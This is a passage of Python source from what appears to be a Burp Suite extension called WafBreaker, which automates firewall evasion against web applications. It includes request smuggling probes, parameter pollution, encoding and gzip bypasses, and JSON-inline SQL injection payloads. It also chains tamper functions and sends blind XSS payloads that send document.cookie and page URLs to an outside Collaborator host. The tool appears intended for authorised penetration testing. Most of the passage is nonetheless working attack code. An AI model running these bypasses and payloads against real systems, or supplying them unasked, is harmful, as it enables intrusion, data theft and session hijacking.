                    req = crlf.join(req_lines[:blank_idx + 1]) + crlf + crlf + chunked_body
            except Exception:
                pass
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[Bypass] Chunked TE (%s)" % _clabel, probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] Chunked TE bypass WORKED: %s" % _clabel)
                self._bypass = {
                    "type":       "header",
                    "headers":    _base_chunked_hdrs,
                    "name":       "chunked-te-" + _clabel,
                    "chunked":    True,
                    "chunk_size": _csize,
                }

        # ── 2-I: HTTP Parameter Pollution (HPP) ───────────────────────────────
        # Duplicate the actual injection parameter — WAF evaluates first value
        # (clean), backend uses last (payload) or merges them.
        # Also test PARAM=safe&PARAM[]=payload and case-variant PARAM vs param.
        self._log("[2-I] HTTP Parameter Pollution (true param duplication)...")
        _hpp_param = "waf"
        _hpp_type  = None
        try:
            _analyzed = self._h.analyzeRequest(self._svc, bytes(self._base_req))
            for _p in _analyzed.getParameters():
                if _p.getType() in (0, 1):   # 0=URL, 1=BODY
                    _hpp_param = _p.getName()
                    _hpp_type  = _p.getType()
                    break
        except Exception:
            pass
        _hpp_probe = probe.lstrip("'\" ")
        _hpp_variants = [
            # Classic: safe_value & param=payload (WAF sees first, backend picks last)
            ("safe_value&%s=%s"         % (_hpp_param, _hpp_probe),   "name=safe&name=payload"),
            # Array notation: some frameworks pick last array element
            ("safe_value&%s[]=%s"       % (_hpp_param, _hpp_probe),   "name=safe&name[]=payload"),
            # Case mismatch: WAF normalises case, some backends don't
            ("safe_value&%s=%s"         % (_hpp_param.upper(), _hpp_probe), "name=safe&NAME=payload"),
        ]
        for _hpp_body, _hpp_label in _hpp_variants:
            if self._bypass:
                break
            req = self._build_request(_hpp_body)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[Bypass] HPP (%s)" % _hpp_label, probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] HPP bypass WORKED: %s" % _hpp_label)
                self._bypass = {
                    "type": "hpp",
                    "name": "hpp-" + _hpp_label,
                    "param": _hpp_param,
                    "variant": _hpp_label,
                }

        # ── 2-J: Tab / form-feed whitespace variants ──────────────────────────
        # Swap spaces for \t, \x0b, \x0c in the probe payload.
        self._log("[2-J] Whitespace variants...")
        ws_variants = [
            (probe.replace(' ', '\t'),    "Tab (\\t)",       '\t'),
            (probe.replace(' ', '\x0b'),  "VT (\\x0b)",      '\x0b'),
            (probe.replace(' ', '\x0c'),  "FF (\\x0c)",      '\x0c'),
            (probe.replace(' ', '\r'),    "CR (\\r)",        '\r'),
            (probe.replace(' ', '\x00'),  "Null byte space", '\x00'),
        ]
        for variant_probe, ws_label, ws_char in ws_variants:
            if variant_probe == probe:
                continue
            req = self._build_request(variant_probe)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[Bypass] Whitespace: " + ws_label,
                                 variant_probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] Whitespace bypass WORKED: " + ws_label)
                self._bypass = {
                    "type": "whitespace",
                    "char": ws_char,
                    "name": "whitespace-" + ws_label,
                }
                break

        # ── 2-K: Cache-busting / noise headers ───────────────────────────────
        # Injecting random junk headers sometimes trips per-session WAF bypass.
        self._log("[2-K] Cache-busting / noise headers...")
        noise_sets = [
            ["X-WafTest: 1", "X-Scanner: WafBreaker"],
            ["X-Custom-Header: bypass", "X-Requested-With: XMLHttpRequest"],
            ["Via: 1.1 localhost", "X-Originating-IP: 127.0.0.1",
             "X-Forwarded-For: 127.0.0.1", "X-Remote-IP: 127.0.0.1"],
            ["Origin: https://localhost", "Referer: https://localhost/admin"],
            ["X-WAF-Bypass: 1", "Pragma: no-cache",
             "Cache-Control: no-store, no-cache", "Upgrade: websocket"],
        ]
        for noise_hdrs in noise_sets:
            req = self._build_request(probe, extra_headers=noise_hdrs)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            label = noise_hdrs[0][:40]
            self._report("[Bypass] Noise: " + label,
                                 probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] Noise-header bypass WORKED: " + label)
                self._bypass = {"type": "header", "headers": noise_hdrs}

        # ── 2-L: Accept-Language / Accept header bypass ───────────────────────
        # Some WAFs skip deep inspection for exotic Accept-Language values.
        self._log("[2-L] Accept / Accept-Language header bypass...")
        accept_sets = [
            ["Accept: */*; q=0.01", "Accept-Language: *"],
            ["Accept: application/json,*/*;q=0.1"],
            ["Accept-Language: en-US,en;q=0.9,x-waf;q=0.1"],
            ["Accept-Encoding: identity;q=0, *;q=0", "Accept: text/html"],
        ]
        for acc_hdrs in accept_sets:
            req = self._build_request(probe, extra_headers=acc_hdrs)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            label = acc_hdrs[0][:40]
            self._report("[Bypass] Accept: " + label,
                                 probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] Accept bypass WORKED: " + label)
                self._bypass = {"type": "header", "headers": acc_hdrs}

        # ── 2-M: LFI path encoding bypass techniques ─────────────────────────────
        if self._vtype == "LFI":
            self._phase_lfi_bypass(probe)

        # ── 2-N: Gzip body compression bypass ────────────────────────────────
        # Many WAFs inspect raw request bytes without decompressing Content-Encoding.
        # The backend decompresses transparently, so the payload reaches the app unseen.
        if not self._bypass:
            self._log("[2-N] Gzip body compression bypass...")
            try:
                req_gz = self._build_request(probe, compress_body=True)
                status_gz, body_gz = self._send(req_gz)
                oc_gz = self._outcome(status_gz, body_gz)
                self._report("[Bypass] Gzip body", probe, status_gz, body_gz, oc_gz)
                if not self._is_blocked(status_gz, body_gz):
                    self._log("[+] Gzip body bypass WORKED")
                    self._bypass = {"type": "gzip_body", "name": "gzip-body"}
            except Exception as _gz_ex:
                self._log("[2-N] Gzip skipped: " + str(_gz_ex))

        # ── 2-O: JSON body injection bypass ──────────────────────────────────
        # Switch Content-Type to application/json and inject payload as a JSON
        # string value.  WAFs often maintain weaker rulesets for JSON bodies.
        # Also test with \\uXXXX unicode escaping — WAF regex won't match,
        # JSON parsers decode before reaching the application.
        if not self._bypass:
            self._log("[2-O] JSON body injection bypass...")
            _json_variants = [
                ("json-raw",            False),
                ("json-unicode-escape", True),
            ]
            for _jlabel, _jescape in _json_variants:
                try:
                    req_j = self._build_request(probe, json_body=True,
                                                json_escape=_jescape)
                    status_j, body_j = self._send(req_j)
                    oc_j = self._outcome(status_j, body_j)
                    self._report("[Bypass] " + _jlabel, probe, status_j, body_j, oc_j)
                    if not self._is_blocked(status_j, body_j):
                        self._log("[+] JSON bypass WORKED: " + _jlabel)
                        self._bypass = {
                            "type":   "json_body",
                            "name":   _jlabel,
                            "escape": _jescape,
                        }
                        break
                except Exception as _j_ex:
                    self._log("[2-O] %s skipped: %s" % (_jlabel, str(_j_ex)))

        # ── 2-P: Cookie-header injection bypass ──────────────────────────────
        # Many WAFs apply weaker or no inspection to cookie header values,
        # especially custom/session cookies.  Inject the probe there in addition
        # to the normal parameter to test this gap.
        if not self._bypass:
            self._log("[2-P] Cookie-header injection bypass...")
            _ck_hdr = "Cookie: waf_test=" + probe.replace(' ', '+')
            req_ck = self._build_request(probe, extra_headers=[_ck_hdr])
            status_ck, body_ck = self._send(req_ck)
            oc_ck = self._outcome(status_ck, body_ck)
            self._report("[Bypass] Cookie inject", probe, status_ck, body_ck, oc_ck)
            if not self._is_blocked(status_ck, body_ck):
                self._log("[+] Cookie injection bypass WORKED")
                self._bypass = {
                    "type": "cookie",
                    "name": "cookie-inject",
                }

        # ── 2-Q: HTTP Request Smuggling probe (TE.CL and CL.TE) ──────────────
        # Only meaningful on POST requests. WAF sees one request boundary;
        # backend parses differently — payload lands in the "shadow" request
        # that the WAF never inspects.  This is a DETECTION probe: if either
        # variant produces a non-blocked response, manual exploitation may be
        # possible.  Real exploitation requires two sequential requests.
        if not self._bypass and _is_post_request(self._base_req):
            self._log("[2-Q] HTTP Request Smuggling probe (TE.CL / CL.TE)...")
            _smug_payload = probe
            _smug_variants = []

            # TE.CL: WAF trusts Transfer-Encoding (sees complete body),
            #        backend trusts Content-Length (reads only first N bytes).
            try:
                _tc_inner = ("%X\r\n%s\r\n0\r\n\r\n"
                             % (len(_smug_payload), _smug_payload)).encode('utf-8')
                _tc_body   = bytearray(_tc_inner)
                _smug_variants.append((
                    ["Transfer-Encoding: chunked",
                     "Content-Length: %d" % (len(_tc_body) - len(_smug_payload) - 10)],
                    _tc_body,
                    "TE.CL",
                ))
            except Exception:
                pass

            # CL.TE: WAF trusts Content-Length (truncated),
            #        backend trusts Transfer-Encoding (reads beyond CL boundary).
            try:
                _ct_inner = ("X\r\n%s\r\n0\r\n\r\n" % _smug_payload).encode('utf-8')
                _ct_body   = bytearray(_ct_inner)
                _smug_variants.append((
                    ["Content-Length: 3",
                     "Transfer-Encoding: chunked"],
                    _ct_body,
                    "CL.TE",
                ))
            except Exception:
                pass

            for _smug_hdrs, _smug_body, _smug_label in _smug_variants:
                if self._bypass:
                    break
                try:
                    req_smug = self._build_request(
                        _smug_payload,
                        extra_headers=_smug_hdrs,
                    )
                    # Overwrite body with pre-built smuggled body
                    _smug_crlf = bytearray([13, 10])
                    _smug_lines = req_smug.split(_smug_crlf)
                    _smug_blank = None
                    for _si, _sl in enumerate(_smug_lines):
                        if len(_sl) == 0:
                            _smug_blank = _si
                            break
                    if _smug_blank is not None:
                        req_smug = (_smug_crlf.join(_smug_lines[:_smug_blank + 1])
                                    + _smug_crlf + _smug_crlf + _smug_body)
                    status_smug, body_smug = self._send(req_smug)
                    oc_smug = self._outcome(status_smug, body_smug)
                    self._report("[Bypass] Request Smuggling (%s)" % _smug_label,
                                 _smug_payload, status_smug, body_smug, oc_smug)
                    if not self._is_blocked(status_smug, body_smug) and not self._bypass:
                        self._log("[+] Request Smuggling probe FIRED: %s" % _smug_label)
                        self._bypass = {
                            "type":    "smuggling",
                            "name":    "smuggling-" + _smug_label,
                            "variant": _smug_label,
                        }
                        self._add_issue(
                            "Potential HTTP Request Smuggling — %s" % self._vtype,
                            "The %s smuggling variant returned a non-blocked response. "
                            "This is a detection probe only — full exploitation requires "
                            "two sequential requests sent to the same persistent connection. "
                            "Manual verification is strongly recommended." % _smug_label,
                            severity="High",
                            confidence="Firm",
                        )
                except Exception:
                    pass

        # ─────────────────────────────────────────────────────────────────────
        # Phase 2-R — JSON-inline SQL bypass (Claroty Team82 technique)
        # Palo Alto, AWS WAF, Cloudflare, F5, Imperva all fail to inspect
        # JSON functions embedded inside SQL injection payloads. MySQL,
        # PostgreSQL, MSSQL, and SQLite execute JSON functions natively so
        # the bypass is transparent to the backend.
        # ─────────────────────────────────────────────────────────────────────
        if not self._bypass and self._vtype == "SQL Injection":
            self._log("[2-R] JSON-inline SQL bypass (Team82/Claroty technique)...")
            _json_inline_probes = [
                ("' OR JSON_LENGTH('{}')<=8896-- -",
                 "json-length-tautology"),
                ("' OR JSON_VALID('1')-- -",
                 "json-valid"),
                ("' OR JSON_OBJECT('a',1)=JSON_OBJECT('a',1)-- -",
                 "json-object-eq"),
                ("' OR JSON_UNQUOTE(JSON_EXTRACT('{\"a\":\"1\"}','$.a'))='1'-- -",
                 "json-unquote-extract"),
                ("' OR JSON_VALUE('{\"a\":\"1\"}','$.a')='1'-- -",
                 "json-value"),
                ("' UNION distinctrow SELECT NULL,NULL,NULL-- -",
                 "distinctrow-null"),
                ("' UNION distinctrow SELECT @@version,NULL,NULL-- -",
                 "distinctrow-version"),
                ("' OR JSON_EXTRACT('{\"a\":1}','$.a')=1-- -",
                 "json-extract-int"),
                ("' OR json_valid('{}')=1-- -",
                 "json-valid-sqlite"),
                ("' OR JSON_LENGTH(JSON_OBJECT('k',1))>0-- -",
                 "json-length-nested"),
            ]
            for _ji_probe, _ji_label in _json_inline_probes:
                if self._bypass:
                    break
                try:
                    req_ji = self._build_request(_ji_probe)
                    status_ji, body_ji = self._send(req_ji)
                    oc_ji = self._outcome(status_ji, body_ji)
                    self._report("[Bypass] json-inline/" + _ji_label,
                                 _ji_probe, status_ji, body_ji, oc_ji)
                    if not self._is_blocked(status_ji, body_ji):
                        self._log("[+] JSON-inline SQL bypass WORKED: " + _ji_label)
                        self._bypass = {
                            "type":  "json_inline",
                            "name":  "json-inline-sql-" + _ji_label,
                            "label": _ji_label,
                        }
                        break
                except Exception:
                    pass

        if self._bypass:
            bypass_name = self._bypass.get("name", self._bypass["type"])
            self._log("[Phase 2 complete]  Active bypass: %s" % bypass_name)
            self._add_issue(
                "WAF Bypass Found — %s" % self._vtype,
                "WafBreaker successfully bypassed the WAF using the following technique "
                "while testing for <b>%s</b>.<br><br>"
                "Bypass technique: <b>%s</b><br>"
                "This means the WAF can be circumvented, allowing malicious payloads "
                "to reach the backend application without being filtered."
                % (self._vtype, bypass_name),
                severity="Medium",
                confidence="Firm",
            )
        else:
            self._log("[Phase 2 complete]  No bypass succeeded — sending payloads raw anyway.")

    # ═════════════════════════════════════════════════════════════════════════
    #   PHASE 2-M — LFI PATH ENCODING BYPASS
    # ═════════════════════════════════════════════════════════════════════════
    def _phase_lfi_bypass(self, probe):
        """
        Test every LFI_TAMPERS transform against the initial probe.
        The first transform that is NOT blocked by the WAF becomes
        self._bypass["type"] == "lfi_encoding" and is applied to all
        subsequent payloads in Phase 3 via _apply_bypass().

        Also tests each tamper combined with the generic header tricks
        already tried in 2-A, in case it's the combination that works.
        """
        self._log("[2-M] LFI encoding bypass techniques (%d transforms)..." % len(LFI_TAMPERS))

        for (tname, tfunc, tdesc) in LFI_TAMPERS:
            # ── Plain transform ───────────────────────────────────────────────
            try:
                transformed = tfunc(probe)
            except Exception:
                continue
            if transformed == probe:
                continue     # transform had no effect on this probe — skip

            req = self._build_request(transformed)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[Bypass] LFI: %s" % tname, transformed, status, body, oc)

            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] LFI encoding bypass WORKED: %s (%s)" % (tname, tdesc))
                self._bypass = {
                    "type":  "lfi_encoding",
                    "func":  tfunc,
                    "name":  tname,
                }

            # ── Transform + XFF header (combined bypass) ──────────────────────
            # Some WAFs require both encoding bypass AND IP trust header.
            if not self._bypass:
                xff_hdrs = ["X-Forwarded-For: 127.0.0.1",
                            "X-Real-IP: 127.0.0.1"]
                req2 = self._build_request(transformed, extra_headers=xff_hdrs)
                status2, body2 = self._send(req2)
                oc2 = self._outcome(status2, body2)
                self._report("[Bypass] LFI+XFF: %s" % tname,
                             transformed, status2, body2, oc2)
                if not self._is_blocked(status2, body2):
                    self._log("[+] LFI+XFF combo bypass WORKED: %s" % tname)
                    self._bypass = {
                        "type":    "lfi_encoding_xff",
                        "func":    tfunc,
                        "name":    tname + "+xff",
                        "headers": xff_hdrs,
                    }

            if self._bypass:
                # Report to Burp Issues immediately
                self._add_issue(
                    "LFI WAF Bypass Found — %s" % self._bypass["name"],
                    "WafBreaker found an LFI-specific WAF bypass technique.<br><br>"
                    "Transform: <b>%s</b> — %s<br>"
                    "Test payload: <code>%s</code><br>"
                    "The transformed payload was not blocked, meaning the WAF "
                    "fails to detect this path traversal encoding variant."
                    % (tname, tdesc, transformed[:300]),
                    severity="Medium",
                    confidence="Firm",
                )
                return      # one working bypass is enough for phase 2-M

        self._log("[2-M complete]  No LFI encoding bypass found.")

    # ═════════════════════════════════════════════════════════════════════════
    #   PHASE 3 — FULL PAYLOAD SWEEP
    # ═════════════════════════════════════════════════════════════════════════
    def _apply_bypass(self, payload, kwargs):
        """Apply the active bypass technique to kwargs and possibly transform payload."""
        if not self._bypass:
            return payload, kwargs
        btype = self._bypass["type"]
        if btype == "header":
            kwargs["extra_headers"] = self._bypass["headers"]
        elif btype == "charset_ibm037":
            payload = ibm037_encode(payload)
            kwargs["charset"] = "ibm037"
        elif btype == "charset":
            kwargs["charset"] = self._bypass["cs"]
        elif btype == "method":
            kwargs["override_method"] = self._bypass["verb"]
        elif btype == "junk":
            kwargs["add_junk"] = True
        elif btype in ("override_header", "ct"):
            kwargs["extra_headers"] = self._bypass["headers"]
        elif btype == "tamper":
            # Apply the winning sqlmap-style tamper function to the payload
            try:
                payload = self._bypass["func"](payload)
            except Exception:
                pass    # silently use untampered payload if transform fails
        elif btype == "lfi_encoding":
            # Apply the winning LFI path transform to the payload
            try:
                payload = self._bypass["func"](payload)
            except Exception:
                pass
        elif btype == "lfi_encoding_xff":
            # LFI transform + X-Forwarded-For trust header combination
            try:
                payload = self._bypass["func"](payload)
            except Exception:
                pass
            kwargs["extra_headers"] = self._bypass["headers"]
        elif btype == "whitespace":
            # Replace every ASCII space with the winning whitespace character
            payload = payload.replace(' ', self._bypass["char"])
        elif btype == "gzip_body":
            # Compress the request body with gzip before sending
            kwargs["compress_body"] = True
        elif btype == "json_body":
            # Re-encode body as JSON; optionally unicode-escape the payload value
            kwargs["json_body"]   = True
            kwargs["json_escape"] = self._bypass.get("escape", False)
        elif btype == "cookie":
            # Inject current payload into a Cookie header (alongside normal injection)
            kwargs["extra_headers"] = [
                "Cookie: waf_test=" + payload.replace(' ', '+')
            ]
        elif btype == "hpp":
            # Duplicate the injection parameter: safe_value first, payload appended
            _param = self._bypass.get("param", "waf")
            payload = "safe_value&%s=%s" % (_param, payload.lstrip("'\" "))
        elif btype == "smuggling":
            # Smuggling requires custom request construction; pass headers only
            kwargs["extra_headers"] = self._bypass.get("headers", [])
        elif btype == "json_inline":
            # Claroty Team82: embed JSON functions in SQL payload.
            # Rewrites boolean tautologies and UNION SELECT using JSON syntax.
            payload = tamper_json_inline(payload)
        return payload, kwargs

    def _phase_payloads(self):
        payloads  = PAYLOADS[self._vtype]
        self._log("[Phase 3]  %d payloads queued..." % len(payloads))
        sqli_confirmed = False   # fire DB fingerprint only once per scan

        for idx, payload in enumerate(payloads, 1):
            self._log("[%d/%d] %s" % (idx, len(payloads), payload[:70]))

            kwargs  = {}
            p, kw   = self._apply_bypass(payload, kwargs)
            req     = self._build_request(p, **kw)
            status, body = self._send(req)
            oc      = self._outcome(status, body)
            self._report("Payload #%d" % idx,
                                 payload, status, body, oc)

            # ── Surface confirmed vulnerability in Burp Issues ────────────────
            if oc == "VULN!":
                bypass_desc = (
                    self._bypass.get("name", self._bypass["type"])
                    if self._bypass else "direct (no WAF / WAF not blocking)"
                )
                if self._vtype == "SQL Injection":
                    # For SQLi: delegate to POC+consolidation helper — deduplicates automatically
                    self._sqli_confirm_and_poc(
                        break_payload  = payload,
                        break_label    = "payload sweep",
                        repair_payload = payload,
                        repair_label   = "direct VULN pattern",
                        db_variant     = None,
                        bool_confirmed = False,
                        source         = "Payload Sweep (Phase 3)",
                        extra_payload  = payload,
                        bypass_desc    = bypass_desc,
                    )
                elif self._vtype not in self._issued_high:
                    # First confirmed hit for this vuln type → file the issue
                    self._issued_high.add(self._vtype)
                    self._add_issue(
                        "%s Vulnerability Confirmed via WAF Bypass" % self._vtype,
                        "WafBreaker confirmed a <b>%s</b> vulnerability.<br><br>"
                        "The payload was reflected or executed in the server response, "
                        "indicating the backend processed the injected data.<br><br>"
                        "Payload: <code>%s</code><br>"
                        "Bypass technique applied: <b>%s</b><br>"
                        "Response status: <b>%d</b>"
                        % (self._vtype, payload[:500], bypass_desc, status),
                        severity="High",
                        confidence="Certain",
                    )
                else:
                    # Already confirmed — just log the additional payload as extra evidence
                    ev = self._vuln_extra_payloads.setdefault(self._vtype, [])
                    ev.append(payload)
                    self._log("[+] Additional %s payload confirmed (no new issue): %s"
                              % (self._vtype, payload[:80]))

            # ── Smart SQLi DB fingerprinting ──────────────────────────────────
            # When a bypass-style SQLi payload passes for the first time →
            # immediately fire true/false pairs for all major DB engines to
            # confirm blind injection and identify the backend.
            if (self._vtype == "SQL Injection"
                    and not sqli_confirmed
                    and oc in ("PASSED", "BYPASS", "VULN!")):
                # Heuristic: looks like a conditional bypass payload
                if any(tok in payload.upper() for tok in
                       ("/**/", "UNION", "AND 1=1", "OR 1=1",
                        "SLEEP", "WAITFOR", "PG_SLEEP", "AND 1",
                        "/*!",   "--", "#")):
                    sqli_confirmed = True
                    self._log("[*] Bypass confirmed on payload #%d — firing DB fingerprint battery..." % idx)
                    self._phase_sqli_fingerprint()

            time.sleep(0.08)

        self._log("[Phase 3 complete]")

        # ── Phase 3.8: Tamper combo sweep (SQLi only, when no bypass yet set) ──
        # If we still haven't found a bypass, try combining pairs of tampers
        # against a representative probe payload to discover compound evasions.
        if (self._vtype == "SQL Injection"
                and not sqli_confirmed
                and not self._bypass):
            self._phase_tamper_combo()

    # ── Phase 3.8: Tamper combination sweep ────────────────────────────────────
    def _phase_tamper_combo(self):
        """
        Try 2-tamper and 3-tamper compositions on canary SQLi payloads.
        After a 2-chain passes the WAF, immediately attempt to extend it to a
        3-chain — WAFs trained on sqlmap's 2-combo output are increasingly common.
        """
        self._log("[Phase 3.8] Tamper combos (2- and 3-tamper chains)...")

        # A compact set of SQLi canary probes likely to trigger WAF rules
        canaries = [
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "1 AND SLEEP(0)--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
        ]

        # Pool: prefer 'any'-db tampers first, pad with mysql-specific ones
        any_tampers   = [(n, f, d) for (n, f, d, db) in SQLI_TAMPERS if db == "any"][:10]
        mysql_tampers = [(n, f, d) for (n, f, d, db) in SQLI_TAMPERS if db == "mysql"][:10]
        pool = any_tampers + mysql_tampers

        for canary in canaries:
            if self._bypass:
                break
            for i, (n1, f1, _d1) in enumerate(pool):
                if self._bypass:
                    break
                for n2, f2, _d2 in pool[i+1:i+4]:   # pair with next 3 in pool
                    try:
                        chained2 = f2(f1(canary))
                    except Exception:
                        continue
                    if chained2 == canary:
                        continue
                    req2 = self._build_request(chained2)
                    status2, body2 = self._send(req2)
                    oc2 = self._outcome(status2, body2)
                    self._report("[Bypass] Combo: %s+%s" % (n1, n2),
                                 chained2, status2, body2, oc2)

                    if not self._is_blocked(status2, body2):
                        # 2-chain passed — try extending to 3-chain before committing
                        extended = False
                        for n3, f3, _d3 in pool[:4]:   # try first 4 as 3rd layer
                            if n3 in (n1, n2):
                                continue
                            try:
                                chained3 = f3(chained2)
                            except Exception:
                                continue
                            if chained3 == chained2:
                                continue
                            req3 = self._build_request(chained3)
                            status3, body3 = self._send(req3)
                            oc3 = self._outcome(status3, body3)
                            self._report("[Bypass] 3-Chain: %s+%s+%s" % (n1, n2, n3),
                                         chained3, status3, body3, oc3)
                            if not self._is_blocked(status3, body3):
                                self._log("[+] 3-Tamper chain WORKED: %s+%s+%s"
                                          % (n1, n2, n3))
                                f1r, f2r, f3r = f1, f2, f3
                                def _triple(p, _a=f1r, _b=f2r, _c=f3r):
                                    return _c(_b(_a(p)))
                                chain_name = "%s+%s+%s" % (n1, n2, n3)
                                self._bypass = {
                                    "type": "tamper",
                                    "func": _triple,
                                    "name": chain_name,
                                }
                                conf3 = self._bypass_confidence(status3, body3)
                                self._add_issue(
                                    "WAF Bypass via 3-Tamper Chain — %s" % chain_name,
                                    "WafBreaker found a <b>three-tamper chain</b> that "
                                    "bypasses the WAF for <b>SQL Injection</b>.<br><br>"
                                    "Chain: <b>%s</b> → <b>%s</b> → <b>%s</b><br>"
                                    "Canary payload: <code>%s</code><br>"
                                    "Result after chain: <code>%s</code>"
                                    % (n1, n2, n3, canary[:200], chained3[:300]),
                                    severity="Medium",
                                    confidence=conf3,
                                )
                                extended = True
                                break

                        if not extended:
                            # 2-chain is the winner
                            self._log("[+] 2-Tamper combo WORKED: %s+%s" % (n1, n2))
                            f1r, f2r = f1, f2
                            def _combo(p, _a=f1r, _b=f2r):
                                return _b(_a(p))
                            chain_name2 = "%s+%s" % (n1, n2)
                            self._bypass = {
                                "type": "tamper",
                                "func": _combo,
                                "name": chain_name2,
                            }
                            conf2 = self._bypass_confidence(status2, body2)
                            self._add_issue(
                                "WAF Bypass via Tamper Chain — %s" % chain_name2,
                                "WafBreaker found a two-tamper chain that bypasses the WAF "
                                "for <b>SQL Injection</b> payloads.<br><br>"
                                "Chain: <b>%s</b> → <b>%s</b><br>"
                                "Test payload: <code>%s</code><br>"
                                "Result payload after chain: <code>%s</code><br>"
                                "The transformed payload was not blocked, indicating the WAF "
                                "cannot detect this obfuscation combination."
                                % (n1, n2, canary[:200], chained2[:300]),
                                severity="Medium",
                                confidence=conf2,
                            )
                        return   # one working chain per canary is enough

        self._log("[Phase 3.8 complete]")

    # ═════════════════════════════════════════════════════════════════════════
    #   PHASE 3.5 — BLIND XSS (Out-of-Band via Burp Collaborator)
    #   Fires payloads that load external resources. If Burp Collaborator
    #   is available the domain is the live Collaborator host; otherwise a
    #   placeholder is used (still useful for manual review).
    #   After sending, polls Collaborator for up to 15 s to detect hits.
    # ═════════════════════════════════════════════════════════════════════════
    def _phase_blind_xss(self):
        self._log("[3.5] Blind XSS — sending OOB payloads...")

        # Resolve Collaborator host — from instance var set in registerExtenderCallbacks
        collab_host = getattr(self, "_collab_host", None) or "YOUR.BURP.COLLABORATOR.HOST"

        _blind_payloads = [
            # Script load (fires even in email clients and headless renderers)
            "<script src=//%s/bxss></script>" % collab_host,
            "<script>new Image().src='//%s/bxss?c='+document.cookie</script>" % collab_host,
            # Img/fetch (fires in more restricted CSP contexts)
            "<img src=//%s/bxss.gif>" % collab_host,
            "<img src=x onerror=\"new Image().src='//%s/bxss'\">",
            # SVG
            "<svg/onload=\"new Image().src='//%s/bxss'\">",
            # CSS import (fires even without script exec)
            "<style>@import//%s/bxss.css</style>" % collab_host,
            # Input autofocus
            "<input autofocus onfocus=\"new Image().src='//%s/bxss'\">",
            # iframe
            "<iframe src=//%s/bxss></iframe>" % collab_host,
            # fetch via XHR
            "<script>fetch('//%s/bxss?u='+location.href)</script>" % collab_host,
            # DOM-based stored trigger
            "<img src=x onerror=\"var s=document.createElement('script');s.src='//%s/bxss';document.head.appendChild(s)\">" % collab_host,
            # Polyglot blind
            "javascript:/*--></title></style></textarea></script></xmp>"
            "<svg/onload='new Image().src=\"//%s/bxss?c=\"+document.cookie'//>" % collab_host,
        ]

        sent_payloads = []
        for bp in _blind_payloads:
            kw = {}
            pp, pkw = self._apply_bypass(bp, kw)
            req = self._build_request(pp, **pkw)
            s, b = self._send(req)
            oc = self._outcome(s, b)
            self._report("[BlindXSS]", bp, s, b, oc)
            sent_payloads.append(bp)

        # ── Poll Collaborator for OOB interactions (Burp Pro only) ────────────
        collab_client = getattr(self, "_collab_client", None)
        interactions = []
        if collab_client:
            import time as _time
            self._log("[3.5] Polling Collaborator for up to 15 s...")
            deadline = _time.time() + 15
            while _time.time() < deadline:
                try:
                    hits = collab_client.fetchAllCollaboratorInteractions()
                    if hits:
                        for hit in hits:
                            interactions.append(
                                "%s from %s at %s" % (
                                    hit.getType(),
                                    hit.getClientIpAddress(),
                                    hit.getTimeStamp(),
                                )
                            )
                        break
                except Exception:
                    pass
                _time.sleep(3)

        if interactions:
            detail = (
                "Blind XSS confirmed via Burp Collaborator OOB interaction.<br><br>"
                "<b>Interactions received:</b><br>"
                + "<br>".join(interactions)
                + "<br><br>"
                "<b>Payloads sent:</b><br>"
                + "<br>".join("<code>%s</code>" % p for p in sent_payloads)
            )
            self._add_issue(
                "Blind XSS — Confirmed via Collaborator",
                detail,
                severity="High",
                confidence="Certain",
            )
            self._log("[3.5] BLIND XSS CONFIRMED — %d interactions" % len(interactions))
        else:
            # No hit yet — still file a Tentative issue so analyst can check manually
            detail = (
                "Blind XSS payloads were injected into the parameter. "
                "No Burp Collaborator callback was received within the poll window, "
                "but the payload may fire later (e.g., when an admin views a stored entry).<br><br>"
                "<b>Collaborator host used:</b> <code>%s</code><br><br>"
                "<b>Payloads sent:</b><br>" % collab_host
                + "<br>".join("<code>%s</code>" % p for p in sent_payloads[:6])
            )
            self._add_issue(
                "Blind XSS — Payloads Injected (awaiting callback)",
                detail,
                severity="Medium",
                confidence="Tentative",
            )
            self._log("[3.5] Blind XSS payloads sent — no callback yet. Check Collaborator.")

    # ═════════════════════════════════════════════════════════════════════════
    #   PHASE 4 — TAMPER SWEEP  (SQL Injection only)
    #   For each tamper script × each payload category, build a tampered
    #   variant of a representative seed payload and fire it.
    #   Uses the active bypass on top if one was found in Phase 2.
    # ═════════════════════════════════════════════════════════════════════════
    def _phase_tamper_sweep(self):
        if self._vtype != "SQL Injection":
            return

        # Each category sends: 1 main seed + up to 3 spread extras = 4 per tamper
        seeds_per_cat  = 4
        total_estimate = len(SQLI_TAMPERS) * len(SQLI_PAYLOAD_SEEDS) * seeds_per_cat
        self._log("[Phase 4] Tamper sweep: %d tampers × %d categories × ~%d seeds ≈ %d requests..." % (
            len(SQLI_TAMPERS), len(SQLI_PAYLOAD_SEEDS), seeds_per_cat, total_estimate))

        sqli_confirmed = False
        done = 0

        for (cat_label, seed_payloads) in SQLI_PAYLOAD_SEEDS:
            # Representative seed = first entry in the category
            seed = seed_payloads[0]

            for (tname, tfunc, tdesc, tdb) in SQLI_TAMPERS:
                done += 1
                try:
                    tampered = tfunc(seed)
                except Exception:
                    continue
                if tampered == seed:
                    continue     # tamper had no visible effect on this payload

                # Optionally stack the winning Phase-2 bypass on top of the tamper
                # (skip stacking if the Phase-2 bypass IS a tamper — avoids double-tamper)
                kwargs = {}
                if self._bypass and self._bypass.get("type") != "tamper":
                    _, kwargs = self._apply_bypass(tampered, kwargs)

                req = self._build_request(tampered, **kwargs)
                status, body = self._send(req)
                oc = self._outcome(status, body)

                label = "[P4] %s | %s" % (cat_label, tname)
                self._report(label, tampered, status, body, oc)

                # Report confirmed vuln to Burp Issues — consolidated, no duplicate issues
                if oc == "VULN!":
                    self._sqli_confirm_and_poc(
                        break_payload  = tampered,
                        break_label    = "tamper: " + tname,
